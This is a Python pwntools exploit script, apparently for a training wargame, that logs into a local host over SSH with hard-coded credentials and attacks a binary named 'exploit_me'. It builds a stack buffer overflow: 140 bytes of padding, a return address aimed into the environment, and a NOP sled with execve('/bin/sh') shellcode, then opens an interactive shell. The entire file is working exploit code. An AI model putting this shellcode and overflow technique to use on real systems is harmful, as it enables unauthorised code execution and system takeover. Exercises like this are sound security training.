#! /usr/bin/env python3
from pwn import *
import os
import time

host = "192.168.1.22"
port = 22

login = "zaz"
binary = "exploit_me"
password = "646da671ca01bb5d84dbb5fb2238dc8e"
remotebinary = "/home/%s/%s" % (login, binary)

shell = ssh(host=host, port=port, user=login, password=password)

shellcode = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0" \
            "\x88\x46\x07\x89\x46\x0c\xb0\x0b" \
            "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c" \
            "\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \
            "\x80\xe8\xdc\xff\xff\xff/bin/sh"
nopesled = "\x90"*900
env_payload = nopesled + shellcode

env_addr = p32(0xbffffd98)
padding = b"B"*140
payload = padding + env_addr

# p = shell.process('/bin/sh')
# p.interactive()

# p = shell.process([remotebinary, payload], env={"shellcode": env_payload})
p = shell.process("""env -i shellcode=$(python -c 'print "\x90" * 900 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') ./exploit_me $(python -c 'print "B"*140+"\x92\xfd\xff\xbf"')""", shell=True)
# p.clean()
# p.sendline("whoami")
p.interactive()
